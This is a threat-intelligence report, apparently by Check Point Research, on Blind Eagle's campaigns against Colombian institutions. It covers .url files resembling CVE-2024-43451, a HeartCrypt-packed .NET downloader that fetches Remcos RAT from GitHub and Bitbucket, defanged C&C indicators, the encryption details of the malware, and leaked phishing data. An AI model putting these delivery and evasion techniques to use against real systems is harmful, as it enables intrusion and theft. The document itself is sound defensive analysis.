&lt;li&gt;The monitored campaigns targeted Colombian judicial institutions and other government or private organizations, with high infection rates. More than &lt;strong&gt;1,600&lt;/strong&gt; victims were affected during one of these campaigns which took place around December 19, 2024. This infection rate is significant considering Blind Eagle&amp;#8217;s targeted APT approach.&lt;/li&gt;



&lt;li&gt;The malware is often delivered using legitimate file-sharing platforms such as &lt;strong&gt;Google Drive&lt;/strong&gt; and &lt;strong&gt;Dropbox&lt;/strong&gt;. However, in recent campaigns, Blind Eagle has also distributed its payloads through &lt;strong&gt;Bitbucket&lt;/strong&gt; and &lt;strong&gt;GitHub&lt;/strong&gt;.&lt;/li&gt;



&lt;li&gt;The group utilizes malware and tools which are well-known within underground crime communities, a trend that continues with recent discoveries. To protect its malware, Blind Eagle leverages the Packer-as-a-Service &lt;strong&gt;HeartCrypt&lt;/strong&gt;, which employs a .NET RAT that appears to be a variant of&amp;nbsp; &lt;strong&gt;PureCrypter&lt;/strong&gt;. The final stage payload is &lt;strong&gt;Remcos RAT&lt;/strong&gt;.&lt;/li&gt;



&lt;li&gt;Blind Eagle has long been suspected to originate from &lt;strong&gt;South America&lt;/strong&gt;. We identified the group&amp;#8217;s operating timezone as &lt;strong&gt;UTC-5&lt;/strong&gt;, which aligns with several &lt;strong&gt;South American&lt;/strong&gt; countries.&lt;/li&gt;



&lt;li&gt;Operation fail (OPFail) revealed phishing campaigns in early March 2024 in which the group impersonated Colombian banks. These campaigns were highly successful, resulting in the collection of over &lt;strong&gt;8,000&lt;/strong&gt; entries of Personally Identifiable Information (PII).&lt;/li&gt;
&lt;/ul&gt;



&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;APT-C-36&lt;/strong&gt;, also known as &lt;strong&gt;Blind Eagle&lt;/strong&gt;, is a threat group that engages in both &lt;strong&gt;espionage and cybercrime&lt;/strong&gt;. It primarily targets organizations in &lt;strong&gt;Colombia&lt;/strong&gt; and other &lt;strong&gt;Latin American countries&lt;/strong&gt;. Active since &lt;strong&gt;2018&lt;/strong&gt;, this &lt;strong&gt;Advanced Persistent Threat (APT)&lt;/strong&gt; group focuses on &lt;strong&gt;government institutions, financial organizations, and critical infrastructure&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;Blind Eagle is known for employing &lt;strong&gt;sophisticated social engineering tactics&lt;/strong&gt;, using &lt;strong&gt;phishing emails&lt;/strong&gt; with &lt;strong&gt;malicious attachments or links&lt;/strong&gt; to gain initial access to target systems. Their malware arsenal includes &lt;strong&gt;commodity Remote Access Trojans (RATs)&lt;/strong&gt; such as &lt;strong&gt;NjRAT&lt;/strong&gt;, &lt;strong&gt;AsyncRAT&lt;/strong&gt;, and &lt;strong&gt;Remcos&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;Our research revealed that the group recently expanded its toolkit with additional commodity malware. To protect their malicious executables, Blind Eagle utilizes the &lt;strong&gt;Packer-as-a-Service HeartCrypt&lt;/strong&gt;, which they use to pack a &lt;strong&gt;.NET RAT&lt;/strong&gt; that appears to be a variant of &lt;strong&gt;PureCrypter&lt;/strong&gt;. &lt;strong&gt;Remcos RAT&lt;/strong&gt; remains the final payload.&lt;/p&gt;



&lt;p&gt;On &lt;strong&gt;November 12, 2024&lt;/strong&gt;, &lt;strong&gt;Microsoft&lt;/strong&gt; patched a newly discovered vulnerability, &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43451"&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt;&lt;/a&gt;. This vulnerability was actively &lt;strong&gt;exploited in the wild&lt;/strong&gt; using &lt;code&gt;.url&lt;/code&gt; files containing &lt;strong&gt;malicious code&lt;/strong&gt;, which could be triggered through &lt;strong&gt;unusual user actions&lt;/strong&gt; such as &lt;strong&gt;right-clicking the file&lt;/strong&gt;, &lt;strong&gt;deleting it&lt;/strong&gt;, or performing a &lt;strong&gt;drag-and-drop operation&lt;/strong&gt;. Exploited as a &lt;strong&gt;zero-day&lt;/strong&gt;, it was used in attacks targeting &lt;strong&gt;Ukraine.&lt;/strong&gt; According to &lt;strong&gt;CERT-UA&lt;/strong&gt;, the campaign was attributed to the threat actor &lt;strong&gt;UAC-0194&lt;/strong&gt;, suspected to be &lt;strong&gt;Russian-affiliated&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;Six days after Microsoft released the patch, &lt;strong&gt;Blind Eagle&lt;/strong&gt; included a variant of this exploit in its attack arsenal and campaigns. While this variant does not actually expose the NTLMv2 hash, it notifies the threat actors that the file was downloaded by the same unusual user-file interactions. On devices vulnerable to &lt;strong&gt;CVE-2024-43451&lt;/strong&gt;, a &lt;strong&gt;WebDAV request&lt;/strong&gt; is triggered even before the user manually interacts with the file with the same unusual behavior. Meanwhile, on both patched and unpatched systems, manually clicking the malicious &lt;code&gt;.url&lt;/code&gt; file initiates the download and execution of the next-stage payload. After incorporating this file into their campaigns, the group targeted mainly Colombian public and private organizations, with high infection rates. More than &lt;strong&gt;1600&lt;/strong&gt; victims were infected during a campaign that occurred around December 19, 2024. Considering Blind Eagle’s targeted APT approach, this infection rate is significant.&lt;/p&gt;



&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Blind Eagle .url Payloads&lt;/h2&gt;



&lt;p&gt;&lt;a href="https://www.clearskysec.com/0d-vulnerability-exploited-in-the_wild/"&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt;&lt;/a&gt; is a vulnerability that exposes a user&amp;#8217;s NTLMv2 hash, which can allow an attacker to authenticate as the user via pass-the-hash or relay attacks. If the compromised account has high privileges and proper mitigations (such as SMB signing and NTLM relay protections) that are not enforced, this could lead to lateral movement, privilege escalation, or even full domain compromise. Eventually, the user, by manually clicking, creates an SMB connection through port 445, which downloads and executes the malicious payload. The exploit reported by CERT-UA:&lt;/p&gt;

&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt; affects all supported Windows versions, and it is triggered in uncommon ways:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;A single right-click on the file (all Windows versions).&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;Deleting the file (Windows 10/11).&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;Dragging the file to another folder (Windows 10/11 and some Windows 7/8/8.1 configurations).&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The &lt;code&gt;.url&lt;/code&gt; file below, used by Blind Eagle against Colombian institutions, is a variant of this CVE, but without the exploiting part, meaning it does not expose the NTLMv2 hash. When manually clicked by the user, this file also downloads malicious files, but instead of using &lt;strong&gt;SMB&lt;/strong&gt; (port: 445), it uses &lt;a href="https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/"&gt;HTTP&lt;/a&gt;. When a URL is in UNC Path format, it first attempts an SMB connection, and if this is unavailable, it attempts WebDAV. However, once the port is specified, which in this case is &lt;code&gt;@80&lt;/code&gt;, the &lt;strong&gt;SMB&lt;/strong&gt; attempt is avoided, and the connection is made directly over &lt;strong&gt;HTTP&lt;/strong&gt; with the &lt;strong&gt;User-Agent&lt;/strong&gt; &lt;code&gt;Microsoft-WebDAV-MiniRedir/10.0.19044&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;While this variant does not directly exploit the vulnerability, it exhibits unusual behavior by communicating with the server without requiring manual user interaction. However, for the &lt;code&gt;.url&lt;/code&gt; file to download the next-stage payload, the user must manually click it, which triggers a WebDAV request over port 80.&lt;/p&gt;



&lt;p&gt;This variant serves as a valuable tool for threat actors, as it notifies them when a targeted user downloads the malicious &lt;code&gt;.url&lt;/code&gt; file. Even if the user does not directly execute the file, Blind Eagle can still detect the interaction, providing insight into potential targets.&lt;/p&gt;

&lt;p&gt;Since Microsoft patched this vulnerability, this unusual behavior no longer occurs. However, manual user interaction can still trigger the download and execution of the malicious payload.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;

&lt;h2 class="wp-block-heading"&gt;Blind Eagle Campaigns&lt;/h2&gt;



&lt;p&gt;Microsoft published this vulnerability on November 12, 2024. On November 18, we observed the first crafted payload. This &lt;code&gt;.url&lt;/code&gt; file infected both patched and unpatched machines. Since then, we observed multiple campaigns targeting Colombia, and the dropped payload was a .NET RAT that downloads the final stage from &lt;strong&gt;GitHub&lt;/strong&gt; or &lt;strong&gt;BitBucket&lt;/strong&gt;, a &lt;strong&gt;Remcos RAT&lt;/strong&gt;. However, to this day, most of those &lt;code&gt;.url&lt;/code&gt; files are not detected by any Anti-Virus engine on VirusTotal.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31214" height="332" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img1-1024x332.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 3&lt;/strong&gt; &amp;#8211; First stage .url undetected on VT.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;These ongoing campaigns, based on filenames, appear to primarily target various &lt;strong&gt;Colombian government organizations&lt;/strong&gt;, including the Justice System. These are some of the malicious &lt;code&gt;.url&lt;/code&gt; filenames:&lt;/p&gt;

&lt;p&gt;While operating with the specific malicious file for over two months, the APT group has changed approximately more than ten different C&amp;amp;Cs (Command and Control Servers) for its final stage payload. The attack chain has some small variations, but the &lt;code&gt;.url&lt;/code&gt; files are always part of the campaign during the initial stage.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;Campaigns ‘socialismo’ &amp;amp; ‘miami’- January 21-22, 2025&lt;/h3&gt;



&lt;p&gt;During the campaigns that took place around January 21 and 22, 2025, the APT group distributed multiple &lt;code&gt;.url&lt;/code&gt; files via email through possibly compromised Google Drive accounts. &lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31215" height="836" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img2.png" width="742" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 4&lt;/strong&gt; &amp;#8211; Email with Google Drive link.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The specified file icon in the &lt;code&gt;.url&lt;/code&gt; file is equivalent to the one from the Edge browser. Many of the endpoints contacted by the &lt;code&gt;.url&lt;/code&gt; contain multiple malicious files, though we can not attribute all files hosted on those servers to &lt;strong&gt;Blind Eagle&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The downloaded executable appears to be packed using the Packer as a Service &lt;strong&gt;HeartCrypt&lt;/strong&gt;. This later injects into &lt;code&gt;csc.exe&lt;/code&gt; a .NET executable responsible for unpacking and executing in memory a .NET RAT, which appears to be a variant of &lt;strong&gt;PureCrypter&lt;/strong&gt;. This .NET RAT retrieves various user and machine information such as 1) Username, 2) OS Version, 3) Process name and architecture, 4) Antivirus installed, and other machine specs. After it decrypted its configuration, which is embedded as a resource, we observed the campaign ID &lt;code&gt;socialismo&lt;/code&gt; and the C&amp;amp;C which communicates. The C&amp;amp;C &lt;code&gt;republicadominica2025[.]ip-ddns[.]com&lt;/code&gt;, after it received the user data, responded with a URL to download and execute the next stage payload. The final stage is downloaded from the GitHub repository &lt;code&gt;Oscarito20222/file&lt;/code&gt;, and the malware is the known Remote Access Trojan &lt;strong&gt;Remcos RAT&lt;/strong&gt; with C&amp;amp;C &lt;code&gt;elyeso.ip-ddns[.]com:30204&lt;/code&gt; and Botnet name &lt;code&gt;redtube&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Both of the domain names from the .NET RAT and the Remcos RAT resolve to the same IP address &lt;code&gt;177.255.85[.]101&lt;/code&gt;. The group has used this IP for multiple Remcos C&amp;amp;Cs through January &amp;amp; February campaigns:&lt;/p&gt;

&lt;p&gt;It is worth mentioning that the attacker&amp;#8217;s GitHub repository is used in multiple Blind Eagle campaigns to deliver the final stage payload, &lt;strong&gt;Remcos.&lt;/strong&gt; This repository is constantly updated with new files that communicate with the latest C&amp;amp;C. All the repository updates were committed in the timezone &lt;code&gt;-0500&lt;/code&gt;, which could possibly indicate Blind Eagle’s country of origin aligns with South American countries. Examples of commits:&lt;/p&gt;

&lt;p&gt;The &lt;strong&gt;GitHub account&lt;/strong&gt; also contains another repository named &lt;code&gt;diciembre&lt;/code&gt;, which includes an archive with a &lt;code&gt;.vbs&lt;/code&gt; file. Notably, this &lt;strong&gt;commit from two years ago&lt;/strong&gt; was made in the same &lt;strong&gt;UTC-5 timezone&lt;/strong&gt; as the recent activity.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;

&lt;p&gt;This repository, which was “untouched” for over two years, was updated on February 25, 2025, and introduced a new &lt;strong&gt;Remcos RAT&lt;/strong&gt; with C&amp;amp;C &lt;code&gt;21ene.ip-ddns[.]com:30204&lt;/code&gt;.&lt;/p&gt;

&lt;h3 class="wp-block-heading"&gt;Campaigns ‘PARAISO’, ‘PARAISO2’, ‘marte’ &amp;amp; ‘saturno’ &amp;#8211; December 2024&lt;/h3&gt;



&lt;p&gt;Although similar to the previous campaign, this one leveraged &lt;strong&gt;Bitbucket&lt;/strong&gt; instead of &lt;strong&gt;GitHub&lt;/strong&gt; as the final-stage distribution platform.&lt;/p&gt;

&lt;p&gt;In these campaigns, two Bitbucket repositories were abused and contained &lt;strong&gt;Remcos RAT&lt;/strong&gt; executable files, which were uploaded to &lt;strong&gt;Bitbucket&lt;/strong&gt; around &lt;strong&gt;December 2024&lt;/strong&gt;. Considering this APT group’s activity and approach, a significant number of victims ultimately downloaded these malicious executables.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31219" height="417" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img6.png" width="758" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 8&lt;/strong&gt; &amp;#8211; &lt;code&gt;facturacioncol/fact&lt;/code&gt; Bitbucket repository.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;PARAISO&lt;/code&gt; campaign was very successful, infecting more than &lt;strong&gt;1600&lt;/strong&gt; victims with &lt;strong&gt;Remcos RAT&lt;/strong&gt; and C&amp;amp;C &lt;code&gt;newstaticfreepoint24.ddns-ip.net:3020&lt;/code&gt;. The total infections across those campaigns, which occurred for over a week, were approximately &lt;strong&gt;9,000&lt;/strong&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31220" height="564" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img7.png" width="830" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 9&lt;/strong&gt; &amp;#8211; &lt;code&gt;trabajo12023/proyecto&lt;/code&gt; Bitbucket repository.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h3 class="wp-block-heading"&gt;Blind Eagle &amp;#8211; .url Campaigns&lt;/h3&gt;



&lt;p&gt;Since adding this file to its arsenal, &lt;strong&gt;Blind Eagle&lt;/strong&gt; consistently targeted &lt;strong&gt;Colombia&lt;/strong&gt;, primarily focusing on &lt;strong&gt;justice and other government organizations&lt;/strong&gt;. The group sent emails with malicious Google Drive links containing either an archive or the actual &lt;code&gt;.url&lt;/code&gt;. Those files triggered WebDAV requests on unpatched machines and, once clicked by the user, resulted in a WebDAV request that downloaded a &lt;strong&gt;HeartCrypt&lt;/strong&gt;-packed malware. This malware then extracted and injected a packed .NET loader into &lt;code&gt;csc.exe&lt;/code&gt;, which later loaded a .NET RAT which appears to be a variant of &lt;strong&gt;PureCrypter&lt;/strong&gt;. This .NET RAT decrypted its configuration, which contains execution parameters such as the C&amp;amp;C server and the campaign ID. After sending encrypted user data, the malware receives a URL to download the final stage payload, &lt;strong&gt;Remcos RAT&lt;/strong&gt;. Those final payloads were initially hosted on compromised servers and later on &lt;strong&gt;GitHub&lt;/strong&gt; or &lt;strong&gt;Bitbucket&lt;/strong&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31221" height="562" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img8-1024x562.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 10&lt;/strong&gt; &amp;#8211; Blind Eagle November until February Campaigns.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Throughout multiple campaigns, the group registered different domain names for its C&amp;amp;C servers, even though they were hosted on the same IP address. During campaigns such as &lt;code&gt;socialismo&lt;/code&gt;, the C&amp;amp;C of the .NET RAT was &lt;code&gt;republicadominica2025[.]ip-ddns[.]com&lt;/code&gt; and for the final stage &lt;code&gt;elyeso.ip-ddns[.]com&lt;/code&gt;, but both of them resolved to the same IP &lt;code&gt;177[.]255.85[.]101&lt;/code&gt;.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;APT OPFail &amp;amp; Past Phishing Campaigns&lt;/h3&gt;



&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; was closely monitoring &lt;strong&gt;Blind Eagle&lt;/strong&gt; activities, we discovered an operation failure in which the group revealed its past phishing activities together with the victim&amp;#8217;s Personally Identifiable Information (&lt;strong&gt;PII&lt;/strong&gt;).&lt;/p&gt;



&lt;p&gt;During January and February, the APT group delivered the last stage payload via files uploaded to the &lt;code&gt;Oscarito20222/file&lt;/code&gt; repository. The account &lt;code&gt;Oscarito20222&lt;/code&gt; also had another repository, which had only one commit from two years ago, &lt;code&gt;Oscarito20222/diciembre&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;On February 25, 2025, this changed. The repository &lt;code&gt;diciembre&lt;/code&gt; received updates and also began delivering &lt;strong&gt;Remcos&lt;/strong&gt; during the next campaigns. To understand why this shift occurred, we had to examine the &lt;strong&gt;previous repository&lt;/strong&gt; responsible for delivering the final payload in the attack chain.&lt;/p&gt;



&lt;p&gt;&lt;code&gt;Oscarito20222/file&lt;/code&gt; final commits:&lt;/p&gt;

&lt;/pre&gt;



&lt;p&gt;For approximately &lt;strong&gt;1 hour and 27 minutes&lt;/strong&gt;, the group uploaded an HTML file named &lt;code&gt;Ver Datos del Formulario.html&lt;/code&gt;, which was later deleted. As of now, this remains the last recorded action in the repository, which occurred on &lt;strong&gt;February 25, 2025, at 15:27 UTC&lt;/strong&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;

&lt;p&gt;At this point, &lt;strong&gt;Blind Eagle&lt;/strong&gt; resumed its activity, using the repository &lt;code&gt;Oscarito20222/diciembre&lt;/code&gt;, with the first commit taking place at &lt;strong&gt;17:39 UTC the same day:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Opfail Timeline:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;2025-02-25 14:01 UTC&lt;/strong&gt;, Blind Eagle uploads to &lt;code&gt;Oscarito20222/file&lt;/code&gt; HTML PII data from phishing activities.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;2025-02-25 15:27 UTC&lt;/strong&gt;, Deletes HTML file containing PII.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;2025-02-25 17:39 UTC&lt;/strong&gt;, Uploads &lt;strong&gt;Remcos RAT&lt;/strong&gt; with C&amp;amp;C &lt;code&gt;21ene.ip-ddns[.]com&lt;/code&gt; to &lt;code&gt;Oscarito20222/diciembre&lt;/code&gt; repository&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;2025-02-25 17:39 UTC&lt;/strong&gt;, Deletes archive from &lt;code&gt;Oscarito20222/diciembre&lt;/code&gt; that was uploaded approximately two years ago.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; obtained this HTML file, which was linked to phishing activities from early March 2024. The phishing domain &lt;code&gt;servicioseguroenlineabb[.]com&lt;/code&gt; appears to have impersonated Colombian Banks.&lt;/p&gt;



&lt;p&gt;The PII data contains four fields:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Nombre de Usuario,&lt;/strong&gt; Username&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Contraseña Usuario,&lt;/strong&gt; User Password&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Correo electrónico,&lt;/strong&gt; Email&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Contraseña del correo,&lt;/strong&gt; Email Password&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Clave Cajero,&lt;/strong&gt; ATM PIN&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;The dataset (Referred to as: &lt;strong&gt;&amp;#8220;Datos del Formulario&amp;#8221;&lt;/strong&gt;) contained &lt;strong&gt;over 8,400 entries&lt;/strong&gt;, with &lt;strong&gt;8,075&lt;/strong&gt; valid after filtering out empty or insufficient records. These valid entries included &lt;strong&gt;account-password pairs&lt;/strong&gt; (username or email or all data filled), with &lt;strong&gt;1,634 email addresses&lt;/strong&gt; identified.&lt;/p&gt;



&lt;p&gt;The phishing campaign specifically targeted &lt;strong&gt;Colombian users&lt;/strong&gt;. Among the collected email addresses:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The majority were &lt;strong&gt;personal accounts&lt;/strong&gt; (Gmail, Yahoo, Hotmail, etc.).&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Five&lt;/strong&gt; belonged to the &lt;strong&gt;Colombian government&lt;/strong&gt;.
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;correo.policia.gov.co&lt;/li&gt;



&lt;li&gt;sic.gov.co&lt;/li&gt;



&lt;li&gt;contraloria.gov.co&lt;/li&gt;



&lt;li&gt;adr.gov.co&lt;/li&gt;



&lt;li&gt;dian.gov.co&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Fourteen&lt;/strong&gt; were associated with &lt;strong&gt;educational institutions&lt;/strong&gt;.&lt;/li&gt;



&lt;li&gt;The remaining addresses belonged to &lt;strong&gt;businesses operating in Colombia&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;



&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;.NET RAT &amp;#8211; “Remcos Downloader”&lt;/h2&gt;



&lt;p&gt;The &lt;strong&gt;.NET RAT&lt;/strong&gt; delivered during the malware campaigns is protected with HeartCrypt, a &lt;a href="https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/"&gt;Packer-as-a-Service&lt;/a&gt; (PaaS) that emerged in early 2024 to obfuscate malware and evade detection by security software. This packer embeds malicious code into otherwise legitimate binaries, with the packed payload stored as a resource. When executed, HeartCrypt first unpacks a simple .NET packer, which is injected into and triggered within &lt;code&gt;csc.exe&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;This &lt;strong&gt;.NET packer&lt;/strong&gt; contains an embedded buffer that is:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Decrypted using AES&lt;/strong&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Decompressed with GZIP&lt;/strong&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Loaded into memory&lt;/strong&gt; as a .NET RAT assembly&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;In addition, the final executable (.NET RAT assembly) is obfuscated with &lt;strong&gt;NET-Reactor&lt;/strong&gt;, applying both &lt;strong&gt;string encryption&lt;/strong&gt; and &lt;strong&gt;control flow obfuscation&lt;/strong&gt; to further hinder analysis.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31223" height="468" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img10.png" width="893" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 12&lt;/strong&gt; &amp;#8211; .NET Packer, Unpacking process.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The majority of the strings are encrypted and stored inside a resource, which is immediately decrypted when execution begins. Then, each time a specific string is required, the malware requests it based on the index ID, where the index points to the &lt;strong&gt;DWORD&lt;/strong&gt; size of the string followed by the string content. The decrypted variable (containing the decrypted strings resource) follows the structure of how strings are stored in the &lt;code&gt;#US&lt;/code&gt; stream in .NET binaries. &lt;a href="https://github.com/SychicBoy/NETReactorSlayer"&gt;NETReactorSlayer&lt;/a&gt; (a well-known open-source deobfuscator for NET-Reactor-protected binaries) is able to decrypt those strings and deobfuscate such binaries.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31224" height="270" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img11-1024x270.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 13&lt;/strong&gt; &amp;#8211; Function that retrieves String based on index ID.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The decrypted resource contains a base64 string, which is deserialized and contains the malware configuration along with the C&amp;amp;C.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;CmIKIXJlcHVibGljYWRvbWluaWNhMjAyNS5pcC1kZG5zLmNvbRD56wEYBSIIbW9ubzEyMzQyCnNvY2lhbGlzbW9CElNwb25zb3JzaGlwVGltZW91dGINTmV4dEFjdGl2YXRvcg==
{
    "1": {
        "1": "republicadominica2025[.]ip-ddns[.]com",

        "8": "SponsorshipTimeout",
        "12": "NextActivator"
    }
}
&lt;/pre&gt;



&lt;p&gt;The malware collects information regarding the execution, machine, and user, then serializes them using &lt;strong&gt;protobuf&lt;/strong&gt; and encrypts them using AES. Data sent to the C&amp;amp;C:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Bot ID&lt;/li&gt;



&lt;li&gt;Campaign ID &lt;code&gt;socialismo&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;Username&lt;/li&gt;



&lt;li&gt;OS Version&lt;/li&gt;



&lt;li&gt;Malware version &lt;code&gt;0.3.9&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;Antivirus installed&lt;/li&gt;



&lt;li&gt;Process Architecture&lt;/li&gt;



&lt;li&gt;Process name&lt;/li&gt;



&lt;li&gt;Machine specs …&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The malware attempts to retrieve IP addresses from the C&amp;amp;C domain name (&lt;code&gt;GetHostAddresses&lt;/code&gt;) and, if successful, sends the collected information.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31225" height="444" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img12.png" width="1010" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 14&lt;/strong&gt; &amp;#8211; GetHostAddresses with C&amp;amp;C.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Data is serialized, and machine information is sent along with the malware campaign &lt;code&gt;socialismo&lt;/code&gt; and version &lt;code&gt;0.3.9&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31226" height="444" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img13.png" width="1015" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 15&lt;/strong&gt; &amp;#8211; Data Serialization.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The AES key used to encrypt and decrypt network communications is derived by calling &lt;code&gt;Rfc2898DeriveBytes&lt;/code&gt; using as a password the mutex name &lt;code&gt;mono1234&lt;/code&gt; and salt &lt;code&gt;{ 1, 2, 23, 234, 37, 48, 134, 63, 248, 4 }&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31227" height="256" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img14.png" width="661" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 16&lt;/strong&gt; &amp;#8211; AES Key generation.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;A similar process then retrieves the response from the C&amp;amp;C server, which responds with a buffer containing the DWORD size followed by the AES encrypted buffer. At this moment, Blind Eagle has utilized this RAT as a downloader, receiving a URL with the file being downloaded and injected either into &lt;code&gt;MSBuild.exe&lt;/code&gt; or &lt;code&gt;InstallUtil.exe&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31228" height="416" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img15.png" width="677" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 17&lt;/strong&gt; &amp;#8211; Random choice of process to be injected.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


